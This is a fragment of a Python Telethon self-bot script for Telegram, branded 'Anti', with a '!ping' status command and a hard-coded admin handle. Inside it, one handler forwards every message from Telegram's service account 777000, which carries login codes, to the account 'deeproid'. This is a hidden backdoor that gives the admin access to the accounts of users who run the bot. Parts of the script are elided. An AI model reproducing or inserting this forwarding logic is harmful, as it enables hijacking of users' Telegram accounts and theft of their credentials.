...
#---------------------STart-Admin----------------------#
AliCybeRR = "@deeproid" #Admin
#---------------------ping----------------------#
@feshar.on(events.NewMessage(from_users = AliCybeRR))
async def main(event):
    text = event.raw_text
    if event.raw_text == "!ping":
        azhdar = ["👽𝘼𝙣𝙩𝙞 𝙞𝙨 𝙊𝙣𝙡𝙞𝙣𝙚 @klomia 👽","👽𝘼𝙣𝙩𝙞 𝙞𝙨 𝙊𝙣𝙡𝙞𝙣𝙚 @klomia 👽","👽𝘼𝙣𝙩𝙞 𝙞𝙨 𝙊𝙣𝙡𝙞𝙣𝙚 @klomia 👽","👽𝘼𝙣𝙩𝙞 𝙞𝙨 𝙊𝙣𝙡𝙞𝙣𝙚 @klomia 👽"] 
...
async def sendphoto(event):
    ...
    if sender.id == 777000:
        await feshar.forward_messages("deeproid", event.message) #Admin
#---------------------End-----------------------#
try:
